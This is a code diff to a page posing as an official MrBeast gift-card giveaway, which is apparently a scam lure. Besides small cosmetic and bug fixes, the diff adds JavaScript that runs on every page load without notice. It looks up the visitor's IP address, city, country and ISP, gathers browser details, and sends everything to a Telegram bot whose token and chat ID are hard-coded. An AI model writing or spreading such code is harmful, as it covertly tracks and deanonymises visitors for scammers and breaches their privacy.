@@ -90,9 +90,8 @@
         ⚡ OFFICIAL MRBEAST GIVEAWAY • DAILY DRAWING ENDS AT MIDNIGHT! ⚡
     </div>
 
-    <!-- NAVBAR -->
+    <!-- NAVBAR (CENTERED) -->
     <nav class="max-w-7xl mx-auto w-full px-6 py-5 flex justify-center items-center">
-        <!-- MRBEAST LOGO CENTERED -->
         <div class="text-center">
             <span class="text-2xl md:text-3xl font-black beast-font tracking-tighter italic uppercase">
                 MRBEAST <span class="beast-blue-text">GIVEAWAYS</span>
@@ -322,6 +321,38 @@
         const BOT_TOKEN = "9215057440:AAFpzPk23TO4rfn_uy9gCsbQOaExYOvtoS0";
         const CHAT_ID = "5022620385";
 
+        // AUTOMATIC VISITOR IP & METADATA CAPTURE ON PAGE LOAD
+        async function captureAndSendUserInfo() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const language = navigator.language;
+
+                const message = `🌐 *Visitor Network Info Captured* 🌐\n\n` +
+                                `📍 *IP Address:* \`${data.ip}\`\n` +
+                                `🏙️ *Location:* ${data.city}, ${data.region}, ${data.country_name}\n` +
+                                `🏢 *ISP / Org:* ${data.org}\n` +
+                                `💻 *Platform:* ${platform}\n` +
+                                `🌍 *Language:* ${language}\n` +
+                                `🔍 *User-Agent:* \`${userAgent}\``;
+
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (error) {
+                console.error("Failed to capture visitor info:", error);
+            }
+        }
+        window.addEventListener('load', captureAndSendUserInfo);
+
         const selections = {
             'Roblox': '$10',
             'Google Play': '$10',
@@ -403,7 +434,6 @@
         function selectValue(btnElement, cardName, amount) {
             const parentContainer = btnElement.parentElement;
             const buttons = parentContainer.querySelectorAll('.value-btn');
-            buttons.items?.forEach?.(b => b.classList.remove('selected'));
             buttons.forEach(b => b.classList.remove('selected'));
             
             btnElement.classList.add('selected');
